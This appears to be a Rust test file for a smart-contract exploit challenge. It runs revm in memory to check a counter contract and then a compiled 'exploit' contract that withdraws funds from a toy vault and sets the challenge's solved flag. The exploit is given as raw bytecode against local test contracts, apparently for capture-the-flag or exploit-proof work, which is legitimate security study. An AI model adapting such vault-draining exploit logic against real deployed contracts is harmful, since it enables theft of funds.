use crate::exploit::contracts::{CHALLENGE_ADDRESS, EXPLOIT_ADDRESS, VAULT_ADDRESS};
use alloy::primitives::TxKind;
use exploit_program::db::InMemoryDatabase;
use exploit_program::interpreter::run_evm;
use revm_interpreter::primitives::{Address, BlockEnv, Bytes, CfgEnv, Env, TxEnv, U256};
use std::str::FromStr;

#[test]
fn test_counter_call() {
    // Prepare env
    let counter_address = Address::from_str("0x353bbe46d23fa5DcCdc6E95574375DdA23903a7a").unwrap();
    let caller = Address::from_str("0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266").unwrap();
    let chain_id = 12;

    let env = Env {
        tx: TxEnv {
            caller,
            chain_id: Some(chain_id),
            gas_limit: 1_000_000,
            transact_to: TxKind::Call(counter_address),
            data: Bytes::from_str("0x371303c0").unwrap(),
            value: U256::ZERO,
            ..Default::default()
        },
        cfg: CfgEnv::default().with_chain_id(chain_id),
        block: BlockEnv::default(),
    };

    // Setup db
    let bytecode = Bytes::from_str("608060405234801561001057600080fd5b50600436106100935760003560e01c80637c507cbd116100665780637c507cbd146100e3578063b3bcfa82146100eb578063d826f88f146100f3578063e86e0b2c146100fc578063f0707ea91461010457600080fd5b806306661abd14610098578063371303c0146100b35780634d629c4b146100bd5780637156699f146100d0575b600080fd5b6100a160005481565b60405190815260200160405180910390f35b6100bb610113565b005b6100bb6100cb366004610212565b61012c565b6100bb6100de366004610212565b610157565b6100bb610185565b6100bb61019b565b6100bb60008055565b6100bb6101ad565b6100bb60008054600019019055565b60016000808282546101259190610241565b9091555050565b600080555b8060005410156101545760008054908061014a8361025a565b9190505550610131565b50565b60008080555b81811015610181576000805490806101748361025a565b909155505060010161015d565b5050565b60008054908061019483610273565b9190505550565b6001600080828254610125919061028a565b600080541161019b5760405162461bcd60e51b815260206004820152602760248201527f636f756e742073686f756c64206265207374726963746c7920677265617465726044820152660207468616e20360cc1b606482015260840160405180910390fd5b60006020828403121561022457600080fd5b5035919050565b634e487b7160e01b600052601160045260246000fd5b808201808211156102545761025461022b565b92915050565b60006001820161026c5761026c61022b565b5060010190565b6000816102825761028261022b565b506000190190565b818103818111156102545761025461022b56fea264697066735822122059ce034209c35577311768b5a8430776ec27e0ebe2a1e8a5bebdd426862472ca64736f6c63430008190033").unwrap();
    let db = InMemoryDatabase {
        balance: [(caller, U256::MAX)].into_iter().collect(),
        code: [(counter_address, bytecode.clone())].into_iter().collect(),
        ..Default::default()
    };

    let evm = revm::EvmBuilder::default()
        .with_env(env.into())
        .with_db(db)
        .build();

    // Run Evm
    let res = run_evm(evm).unwrap();

    // Check that the counter has been incremented
    assert_eq!(
        res.state
            .get(&counter_address)
            .unwrap()
            .storage
            .get(&U256::ZERO)
            .unwrap()
            .present_value,
        U256::from(1)
    );
}

#[test]
fn test_exploit() {
    // Prepare env
    let caller = Address::from_str("0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266").unwrap();
    let chain_id = 12;
    let env = Env {
        tx: TxEnv {
            caller,
            chain_id: Some(chain_id),
            gas_limit: 1_000_000,
            transact_to: TxKind::Call(*CHALLENGE_ADDRESS),
            data: Bytes::from_str("0xb0d691fe").unwrap(),
            value: U256::ZERO,
            ..Default::default()
        },
        cfg: CfgEnv::default().with_chain_id(chain_id),
        block: BlockEnv::default(),
    };

    // Start db
    let challenge_bytecode = Bytes::from_str("608060405234801561000f575f80fd5b5060043610610029575f3560e01c8063b0d691fe1461002d575b5f80fd5b610035610037565b005b670de0b6b3a7640000734330e5e62a8fb0219900b20f4c6c78d11bf9d1f53114610063576100636100f5565b61006b61009e565b6002734330e5e62a8fb0219900b20f4c6c78d11bf9d1f53110610090576100906100f5565b5f805460ff19166001179055565b6040515f9062bada5560881b908281818181865af19150503d805f81146100e0576040519150601f19603f3d011682016040523d82523d5f602084013e6100e5565b606091505b50509050806100f2575f80fd5b50565b634e487b7160e01b5f52600160045260245ffdfea26469706673582212203f8e164e73ff0a81ab460815d8295eeee7416d98a006ed10ccc14228377bd2bf64736f6c63430008140033").unwrap();
    let exploit_bytecode = Bytes::from_str("608060405273feedc0ddffffffffffffffffffffffffffffffff19330161008957734330e5e62a8fb0219900b20f4c6c78d11bf9d1f56001600160a01b031663d0e30db0475f8190556040518263ffffffff1660e01b81526004015f604051808303818588803b158015610071575f80fd5b505af1158015610083573d5f803e3d5ffd5b50505050505b5f8054734330e5e62a8fb0219900b20f4c6c78d11bf9d1f53191906100af90839061011a565b9050801561011857604051632e1a7d4d60e01b815260048101829052734330e5e62a8fb0219900b20f4c6c78d11bf9d1f590632e1a7d4d906024015f604051808303815f87803b158015610101575f80fd5b505af1158015610113573d5f803e3d5ffd5b505050505b005b5f818310610128578161012a565b825b939250505056fea2646970667358221220bd29d63961ab6d46adb89fcd6951582fa1cb4a3d83f85da97b0cead5aba94cfa64736f6c63430008140033").unwrap();
    let vault_bytecode = Bytes::from_str("608060405260043610610028575f3560e01c80632e1a7d4d1461002c578063d0e30db014610041575b5f80fd5b61003f61003a366004610105565b610049565b005b61003f610080565b335f818152602081905260409020549061006390836100a5565b61006d8282610130565b335f908152602081905260409020555050565b335f908152602081905260408120805434929061009e908490610149565b9091555050565b5f826001600160a01b0316826040515f6040518083038185875af1925050503d805f81146100ee576040519150601f19603f3d011682016040523d82523d5f602084013e6100f3565b606091505b5050905080610100575f80fd5b505050565b5f60208284031215610115575f80fd5b5035919050565b634e487b7160e01b5f52601160045260245ffd5b818103818111156101435761014361011c565b92915050565b808201808211156101435761014361011c56fea2646970667358221220446e766fa936e50befef164231e748b5b66e0bdc5323171d6f525b2a1e1caa9864736f6c63430008140033").unwrap();

    let one_ether = U256::from(1e18 as u64);
    let db = InMemoryDatabase {
        balance: [
            (caller, U256::MAX),
            (*VAULT_ADDRESS, one_ether),
            (*EXPLOIT_ADDRESS, one_ether),
        ]
        .into_iter()
        .collect(),
        code: [
            (*CHALLENGE_ADDRESS, challenge_bytecode.clone()),
            (*EXPLOIT_ADDRESS, exploit_bytecode),
            (*VAULT_ADDRESS, vault_bytecode),
        ]
        .into_iter()
        .collect(),
        ..Default::default()
    };
    let evm = revm::EvmBuilder::default()
        .with_env(env.into())
        .with_db(db)
        .build();

    // Run until the end
    let res = run_evm(evm).unwrap();

    // Check that the challenge has been solved
    assert_eq!(
        res.state
            .get(&*CHALLENGE_ADDRESS)
            .unwrap()
            .storage
            .get(&U256::ZERO)
            .unwrap()
            .present_value,
        U256::from(1)
    );
}
